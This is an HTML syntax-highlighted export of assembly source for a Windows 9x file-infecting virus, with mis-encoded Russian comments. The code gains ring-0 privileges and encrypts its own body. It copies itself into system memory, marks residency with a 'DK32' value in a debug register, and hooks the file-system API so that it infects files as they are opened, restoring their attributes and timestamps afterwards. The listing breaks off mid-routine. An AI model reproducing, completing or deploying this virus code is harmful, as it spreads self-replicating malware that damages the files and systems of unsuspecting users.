<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">vmm.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">ifs.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">ifsmgr.inc</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;¯à¥¤¥«¥­¨¥ ª®­áâ ­â</span><span class="sc0">
</span><span class="sc5">TRUE</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">FALSE</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">DEBUG_INT1</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">FALSE</span><span class="sc0">
</span><span class="sc5">DEBUG_EXF</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">FALSE</span><span class="sc0">
</span><span class="sc5">length_of_virus</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">end_virus</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;‘¤¥áì ¨¤¥â á ¬ ¢¨pãá</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc2">.386p</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc0">
</span><span class="sc9">.data</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0">
</span><span class="sc5">start_virus</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">DEBUG_INT1</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">1h</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">

        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">init_virus</span><span class="sc0">
</span><span class="sc5">init_virus</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">      </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">init_virus</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">open_RING0_function</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RING0_virus</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">      </span><span class="sc2">3h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">      </span><span class="sc2">3h</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">68h</span><span class="sc0"> </span><span class="sc1">;PUSH</span><span class="sc0">
</span><span class="sc5">programm_RVA_with_IMAGEBASE</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">       </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">exit</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">ring0.asm</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">already_in_memory</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">RING0_virus</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">DEBUG_INT1</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">1h</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">DR1</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'DK32'</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">already_in_memory</span><span class="sc0">
</span><span class="sc1">;ßßßßßßßßßßßßßßßßßßßßßßßßßßßß  áè¨äp®¢é¨ª ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">0B0h</span><span class="sc0"> </span><span class="sc1">;MOV AL,00</span><span class="sc0">
</span><span class="sc5">crypt_byte</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">end_crypt</span><span class="sc4">-</span><span class="sc5">start_crypt</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">start_crypt</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">encrypt</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">     </span><span class="sc5">encrypt</span><span class="sc0">
</span><span class="sc1">;ßßßßßßßßßßßßßßßßßßßßß ‡ è¨äp®¢ ­­ ï ç áâì ¢¨pãá  ßßßßßßßßßßßßßßßßßßßßßßßßßßß</span><span class="sc0">
</span><span class="sc5">start_crypt</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">adjust_VXDCall</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc5">PAGECONTIG</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc5">PAGEFIXED</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc5">PAGEZEROINIT</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc5">PAGEUSEALIGN</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc2">00100000h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc5">PG_SYS</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc2">00000004h</span><span class="sc0">      </span><span class="sc1">;‘ª®«ìª® áâp ­¨æ ¯p¥¤®áâ ¢¨âì</span><span class="sc0">
</span><span class="sc5">VXDCall_PageAllocate</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">      </span><span class="sc2">20h</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc5">_PageAllocate</span><span class="sc4">,</span><span class="sc5">VMM_DEVICE_ID</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">       </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">already_in_memory</span><span class="sc0">
        </span><span class="sc1">;EAX -  ¤p¥áá áâp ­¨æë</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">length_of_virus</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">      </span><span class="sc6">movsb</span><span class="sc0"> </span><span class="sc1">;DS:[ESI] -&gt; ES:[EDI]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">obr_IFSAPI</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc5">VXDCall_IFSMgr_InstallFileSystemApiHook</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">      </span><span class="sc2">20h</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc5">_InstallFileSystemApiHook</span><span class="sc4">,</span><span class="sc5">IFSMgr_Device_ID</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">old_FSAPI</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'DK32'</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">DR1</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">already_in_memory</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">adjust_VXDCall</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">number_of_entries_in_VXDCall_table</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">VXDCall_table</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">next_entry</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start_virus</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">      </span><span class="sc6">movsb</span><span class="sc0"> </span><span class="sc1">;DS:[ESI] -&gt; ES:[EDI]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">     </span><span class="sc5">next_entry</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">number_of_entries_in_VXDCall_table</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">VXDCall_table</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">;VXDCall _PageAllocate</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">       </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VXDCall_PageAllocate</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">      </span><span class="sc2">20h</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc5">_PageAllocate</span><span class="sc4">,</span><span class="sc5">VMM_DEVICE_ID</span><span class="sc0">
        </span><span class="sc1">;VXDCall IFSMgr_InstallFileSystemApiHook</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">       </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VXDCall_IFSMgr_InstallFileSystemApiHook</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">      </span><span class="sc2">20h</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc5">_InstallFileSystemApiHook</span><span class="sc4">,</span><span class="sc5">IFSMgr_Device_ID</span><span class="sc0">
        </span><span class="sc1">;VXDCall UniToBCSPath</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">       </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VXDCall_UniToBCSPath</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">      </span><span class="sc2">20h</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc5">_UniToBCSPath</span><span class="sc4">,</span><span class="sc5">IFSMgr_Device_ID</span><span class="sc0">
        </span><span class="sc1">;VXDCall IFSMgr_Ring0_FileIO</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">       </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VXDCall_IFSMgr_Ring0_FileIO</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">      </span><span class="sc2">20h</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc5">_IFSMgr_Ring0_FileIO</span><span class="sc4">,</span><span class="sc5">IFSMgr_Device_ID</span><span class="sc0">
</span><span class="sc1">;ßßßßßßßßßßßßßßßßßßßßßßßßßß ¡p ¡®âç¨ª IFSAPI ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß</span><span class="sc0">
</span><span class="sc5">obr_IFSAPI</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">   </span><span class="sc1">;ESP-20h</span><span class="sc0">
        </span><span class="sc6">pushfd</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">init_obr_IFSAPI</span><span class="sc0">
</span><span class="sc5">init_obr_IFSAPI</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">      </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">init_obr_IFSAPI</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">busy_flag</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">virus_busy</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">busy_flag</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">34h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc2">24h</span><span class="sc0"> </span><span class="sc1">;âªpëâ¨¥ ä ©« </span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">unbusy_virus_quit</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">path_to_file</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;H®¬¥à ¤¨áª , ­  ª®â®à®¬ ¢á¥ ¯à®¨áå®¤¨â (1 = A: .. 0ffh - UNC)</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">disk_not_present</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc12">':'</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">2h</span><span class="sc0">
</span><span class="sc5">disk_not_present</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc2">00</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;“ª § â¥«ì ­  áâàãªâãàã ¢ë§®¢  IFS ¬¥­¥¤¦¥à  (IOREQ)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;Š®¤®¢ ï áâà ­¨æ , ¢ ª®â®à®© î§¥à ­ ¡à « á¢®î áà®ªã</span><span class="sc0">
                                  </span><span class="sc1">;BCS_ANSI = ANSI, BCS_OEM = OEM</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">              </span><span class="sc1">;Šã¤  ¯®«®¦¨âì ¯ãâì</span><span class="sc0">
</span><span class="sc5">VXDCall_UniToBCSPath</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">      </span><span class="sc2">20h</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc5">_UniToBCSPath</span><span class="sc4">,</span><span class="sc5">IFSMgr_Device_ID</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">],</span><span class="sc2">01</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">unbusy_virus_quit</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">void_attr</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">unbusy_virus_quit</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">open_file</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">set_attr_quit</span><span class="sc0">
        </span><span class="sc1">;‚å®¤: âªpëâë© HANDLE</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">asciiz</span><span class="sc0">
        </span><span class="sc1">;‚å®¤: âªpëâë© HANDLE</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">zaraza</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">close_file</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_time</span><span class="sc0">
</span><span class="sc5">set_attr_quit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_attr</span><span class="sc0">
</span><span class="sc5">unbusy_virus_quit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">busy_flag</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">quit_obr_IFSAPI</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">popfd</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">25h</span><span class="sc0"> </span><span class="sc1">;JMP []</span><span class="sc0">
</span><span class="sc5">old_FSAPI</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">       </span><span class="sc2">00000h</span><span class="sc0">
</span><span class="sc5">virus_busy</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">44h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">30h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">34h</span><span class="sc4">],</span><span class="sc2">24h</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">no_open_file</span><span class="sc0">
